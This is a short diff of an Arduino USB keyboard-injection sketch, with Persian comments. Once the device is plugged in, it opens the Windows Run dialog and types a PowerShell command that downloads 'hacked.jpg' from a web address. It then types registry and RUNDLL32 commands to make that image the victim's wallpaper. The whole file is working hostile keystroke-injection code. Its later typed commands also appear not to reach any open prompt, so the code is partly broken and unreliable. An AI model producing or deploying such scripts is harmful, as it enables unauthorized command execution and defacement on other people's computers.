@@ -1,16 +1,21 @@
-#include "Arduino.h"
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-
+#include <USBHIDKeyboard.h>
 USBHIDKeyboard Keyboard;
 
 void setup() {
-    USB.begin();
-    Keyboard.begin();
-    delay(2000);
-    Keyboard.println("powershell Invoke-WebRequest -Uri \"https://example.com/image.jpg\" -OutFile \"C:\\Users\\Public\\wallpaper.jpg\"");
-    delay(2000);
-    Keyboard.println("reg add HKCU\\Control Panel\\Desktop /v Wallpaper /t REG_SZ /d C:\\Users\\Public\\wallpaper.jpg /f && RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
+  Keyboard.begin();
+  delay(3000);
+  
+  // دانلود تصویر از اینترنت
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println("powershell Invoke-WebRequest -Uri 'https://example.com/hacked.jpg' -OutFile $env:TEMP\\wall.jpg");
+  delay(3000);
+  
+  // اعمال والپیپر از طریق رجیستری
+  Keyboard.println("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"%TEMP%\\wall.jpg\" /f");
+  Keyboard.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
 }
 
 void loop() {}
